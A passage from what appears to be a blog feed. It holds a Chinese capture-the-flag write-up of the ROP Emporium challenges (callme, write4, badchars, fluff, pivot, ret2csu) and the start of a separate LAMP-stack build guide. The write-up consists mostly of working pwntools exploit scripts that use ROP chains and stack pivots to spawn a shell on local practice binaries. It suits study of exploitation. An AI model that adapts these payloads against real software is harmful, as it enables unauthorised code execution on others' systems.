alt><br>找到以后发现应该是按照顺序调用<code>callme-one，callme-two，callme-three</code>需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./callme32&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 44callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0pop3_ret = 0x080488a9payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>其中<code>pop3_ret</code> 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是<code>call</code>所以在填的时候，应该是填充其plt的地址。<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64位：-1"><a href="#64位：-1" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./callme&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 40callme_one = 0x00401850callme_two = 0x000401870callme_three = 0x00401810pop3_ret = 0x0000000000401ab0payload = &#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>利用 <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>这个gadget来控制参数。</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题跟前面第2题很像，但是就是没有给你<code>cat flag</code> 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把<code>/bin/sh</code>往bss段上写,然后接着拿shell就好了。</p><pre><code>ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;</code></pre><p><strong>查好用的gadgets：</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>利用这即可就可以了，32位的类似。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./write432&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write432&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 44bss = 0x804A06C-0x10pop_edi_pop_ebp_ret = 0x080486dasystem = 0x8048430key = 0x08048670 #mov dword ptr [edi], ebp ; retpayload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\x00\x00&#39;,key,system,0xdeadbeef,bss])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-2"><a href="#64位：-2" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./write4&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write4&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 40bss = 0x601090-0x10key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; retkey2 = 0x0000000000400890# pop r14 ; pop r15 ; retkey3 = 0x0000000000400893#pop rdi ; retsystem = 0x000004005E0payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\x00&#39;,key1,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题目跟前一个write4十分的相似，但是其过滤了个别字符：<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>会将其替换为<code>0xEB</code>，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造<code>system(sh)</code>来拿的shell。<br>例子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>传过去的是<code>sh\x00\x00\x00\x00\x00\x00\x00</code> 到bss是这个情况，然后去找xor的gadget：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。<br>这个题目在gdb调试exp时会发现有比较便捷的办法。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-3"><a href="#32位：-3" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./badchars32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars32&#39;)key1 = 0x08048893# mov dword ptr [edi], esi ; retkey2 = 0x08048899# pop esi ; pop edi ; retkey3 = 0x08048461# pop ebx ; retbss = 0x804A06C-10key4 = 0x08048897# pop ecx ; retkey5 = 0x08048890#xor byte ptr [ebx], cl ; retsys = 0x080484E0offset = 44payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-3"><a href="#64位：-3" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./badchars&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars&#39;)offset = 40bss = 0x6010B0key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; retkey2 = 0x0000000000400b3b# pop r12 ; pop r13 ; retkey3 = 0x0000000000400b39#pop rdi ; retkey4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; retkey5 = 0x0000000000400b40#pop r14 ; pop r15 ; retsystem = 0x004006F0payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00\x00\x00\x00\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在：</p><pre><code>mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。<br>其中64位的找可用gadget，还需要控制一下深度：</p><pre><code>ROPgadget --binary ./fluff --depth 15 </code></pre><p>这样找出足够的gadget，以便自己试用。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-4"><a href="#32位：-4" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./fluff32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff32&#39;)key1 = 0x080483e1# pop ebx ; retkey2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retkey3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retbss = 0x804A06Ckey4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retkey5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; retsys = 0x8048430offset = 44payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\x00\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-4"><a href="#64位：-4" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./fluff&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff&#39;)key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; retkey2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retkey3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retbss = 0x601090key4 = 0x0000000000400840##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retkey5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retkey6 = 0x00000000004008c3# pop rdi ; retsys = 0x4005E0offset = 40payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>这个题一看就是栈转移了。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>可以看到会给你泄漏一个堆地址，给你去栈转移。<br>接着看后门函数，发现这里call一个与libc连接的函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>接着分析一下给定的so文件：<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><pre><code class="c">void __noreturn ret2win(){  system(&quot;/bin/cat flag.txt&quot;);  exit(0);}</code></pre><p>接着就有思路了，栈转移到给你的堆地址上，然后构造rop链：</p><ul><li>leak <code>foothold_function_got</code></li><li>算出给的libc基址，回到start，再次利用漏洞</li><li>构造jmp到ret2win的链即可<br>但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。</li></ul><p>根据给的堆地址和so文件映射基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32位：-5"><a href="#32位：-5" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)libc = ELF(&#39;./libpivot32.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x080486a8 #: leave ; retio.recvuntil(&#39;0x&#39;)leak = int(io.recv(8),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = u32(io.recv(4))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)payload = &#39;a&#39; * 44 + p32(ret2win)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-5"><a href="#64位：-5" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x0000000000400a39 #: leave ; retkey2 = 0x0000000000400b73#pop rdi ; retkey3 = 0x0000000000400b02#xchg rax, rsp ; retkey4 = 0x0000000000400b00#pop rax ; retprint(&#39;offset:&#39; + hex(offset))io.recvuntil(&#39;0x&#39;)leak = int(io.recv(12),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = int(u64(io.recv(6).ljust(8,&#39;\x00&#39;)))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]print(&#39;ret2win&#39;+ hex(ret2win))# raw_input(&#39;-&gt;&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(ret2win)io.sendline(payload)io.interactive()</code></pre><p>这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现<code>leave ret</code>的这个gadget，地址都是有<code>0x0a</code>,所以只能更换gadget，来伪造栈。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32位：-6"><a href="#32位：-6" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)offset = 44io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(8),16) + 1921272 + 0x000000967print(&#39;leak&#39;+ hex(leak1))raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p32(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-6"><a href="#64位：-6" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)offset = 40io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;]raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p64(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为<code>0xdeadcafebabebeef</code> 就可以了。但是比较难搞的一点是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为<code>call 0xaaaaa</code> 汇编作用：</p><ul><li>push PC（也就是该汇编指令的下一个汇编指令的地址）</li><li><code>jmp [0xaaaaa]</code> 是该函数point指向的地址</li></ul><p>这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>但是会发现上面还有一个动态链接<code>_DYNAMIC</code>的信息，跟进去：<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>发现一堆初始化用的函数。然后点进去第一个可以看看：<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着<code>0x400560</code>，毫无疑问肯定是这个<code>_DYNAMIC</code>里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>发现应该是<code>0x0600E38</code>。接下来的就简单了，传统的ret2csu。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./ret2csu&#39;)elf = ELF(&#39;./ret2csu&#39;)offset = 40io.recvuntil(&#39;&gt;&#39;)key1 = 0x040089Akey2 = 0x000400880key3 = 0x0000600E38raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1])io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ropemporium-通关记录&quot;&gt;&lt;a href=&quot;#Ropemporium-通关记录&quot; class=&quot;headerlink&quot; title=&quot;Ropemporium 通关记录&quot;&gt;&lt;/a&gt;Ropemporium 通关记录&lt;/h1&gt;&lt;h2 id=&quot;ret2win&quot;&gt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>linux- Lamp搭建记录</title>
    <link href="http://chumen77.xyz/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/08/linux_ Lamp搭建记录/</id>
    <published>2020-04-08T06:24:44.064Z</published>
    <updated>2020-04-15T14:16:28.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lamp搭建记录"><a href="#Lamp搭建记录" class="headerlink" title="Lamp搭建记录"></a>Lamp搭建记录</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装编译环境："><a href="#安装编译环境：" class="headerlink" title="安装编译环境："></a>安装编译环境：</h3><pre><code>yum -y install gcc*</code></pre><p>安装好后记得关闭防火墙和selinux</p><h3 id="准备软件包"><a href="#准备软件包" class="headerlink" title="准备软件包"></a>准备软件包</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>把这些安装包都放入虚拟机自定义的路径，等待使用。</p><h3 id="shell脚本批量解包"><a href="#shell脚本批量解包" class="headerlink" title="shell脚本批量解包"></a>shell脚本批量解包</h3><pre><code class="bash">#!/bin/bash/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.listfor a in `cat ls.list`do        /bin/tar -zxf $adonerm -rf ls.list</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>然后开始一一的装包，注意需要按照一定的顺序来装的。</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><pre><code class="bash">yum -y install python-devel</code></pre><p>安装python的底层环境。</p><pre><code class="bash">[root@localhost lamp1]# cd libxml2-2.9.1/[root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/[root@localhost libxml2-2.9.1]# make[root@localhost libxml2-2.9.1]# make install</code></pre><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>提供一些加密算法：</p><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/[root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/[root@localhost libmcrypt-2.5.8]# make[root@localhost libmcrypt-2.5.8]# make install</code></pre><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/[root@localhost libltdl]# ./configure --enable-ltdl-install[root@localhost libltdl]# make[root@localhost libltdl]# make install</code></pre><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>提供加密方式的扩展</p><pre><code class="bash">[root@localhost lamp1]# cd mhash-0.9.9.9/[root@localhost mhash-0.9.9.9]# ./configure</code></pre><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>提供php相关的加密支持拓展库</p><pre><code class="bash">[root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt[root@localhost mcrypt-2.6.8]# make[root@localhost mcrypt-2.6.8]# make install</code></pre><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>提供压缩用途的函数库</p><pre><code class="bash">[roott@localhost lamp1]# cd zlib-1.2.3/[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install</code></pre><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><pre><code class="bash">[root@localhost zlib-1.2.3]# cd ../[root@localhost lamp1]# cd libpng-1.2.31/[root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng[root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install</code></pre><p>如果出现：</p><pre><code class="bash">/usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata&#39; can not be used when making a shared object; recompile with -fPIC</code></pre><p>解决办法 ： </p><pre><code class="bash">[root@localhost lamp1]# cd zlib-1.2.3 //进入zlib目录[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# CFLAGS=&quot;-O3 -fPIC&quot; ./configure   --prefix=/usr/local/zlib/ #使用64位元的方法进行编译[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install[root@localhost zlib-1.2.3]# make clean</code></pre><p>然后在重新来安装libpng即可。</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>提供jpeg格式的图片</p><pre><code class="bash">[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include[root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1</code></pre><pre><code class="bash">root@localhost lamp]# cd jpeg-6b/[root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</code></pre><p>如果发生这样的报错：</p><pre><code class="bash">[root@localhost jpeg-6b]# make./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtool：命令未找到make: *** [jcapimin.lo] 错误 127</code></pre><p>需要：</p><pre><code class="bash">[root@localhost jpeg-6b]# yum -y install libtool[root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess .cp：是否覆盖&quot;./config.guess&quot;？ yes[root@localhost jpeg-6b]# make clean</code></pre><p>重新再来就好。</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>字体库。</p><pre><code class="bash">[root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype</code></pre><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>给php提供图形拓展的库</p><pre><code class="bash">[root@localhost lamp]# mkdir /usr/local/gd2[root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/[root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</code></pre><p>这样会爆一个错，然后需要改一下源码：</p><pre><code class="bash">[root@localhost gd-2.0.35]# vim gd_png.c</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>需要指定一下路径即可，这个刚刚是已经安装过的。</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>先装两个工具包：</p><pre><code>cp -r apr-1.4.6 httpd-2.4.7/srclib/aprcp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util</code></pre><h3 id="开始装httped："><a href="#开始装httped：" class="headerlink" title="开始装httped："></a>开始装httped：</h3><p>先进入装一下pcre：</p><pre><code>./configuremakemake install</code></pre><p>进入httped：<br>先对配置进行设置：</p><pre><code>./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=sharedmakemake install</code></pre><h3 id="开服务："><a href="#开服务：" class="headerlink" title="开服务："></a>开服务：</h3><pre><code>/usr/local/apache2/bin/apachectl start</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>设置开机时自动启动这个服务。</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h3><p>装两个工具：</p><pre><code>[root@localhost local]# yum -y install cmake[root@localhost local]# yum -y install bison[root@localhost local]# yum -y install ncurses-devel</code></pre><p>建立一个用户：</p><pre><code>[root@localhost local]# useradd mysql[root@localhost local]# id mysqluid=1001(mysql) gid=1001(mysql) 组=1001(mysql)</code></pre><p>安装ncurses：</p><pre><code>[root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite[root@localhost ncurses-5.9]# make[root@localhost ncurses-5.9]# make install</code></pre><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \&gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \&gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \&gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \&gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \&gt; -DMYSQL_TCP_PORT=3306</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost  mysql-5.5.23]# make[root@localhost  mysql-5.5.23]# make install</code></pre><h3 id="简单设置"><a href="#简单设置" class="headerlink" title="简单设置"></a>简单设置</h3><p>初始化mysql：</p><pre><code>[root@localhost mysql]# chown -R mysql:mysql .[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>设置权限：</p><pre><code>[root@localhost mysql]# chown -R root .[root@localhost mysql]# chown -R mysql data/</code></pre><p>覆盖一下配置文件：</p><pre><code>[root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnfcp：是否覆盖&quot;/etc/my.cnf&quot;？ yes</code></pre><p>接着初始化：</p><pre><code>[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql200408 03:38:45 mysqld_safe Logging to &#39;/usr/local/mysql/data/localhost.localdomain.err&#39;.200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p>发现卡死了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" 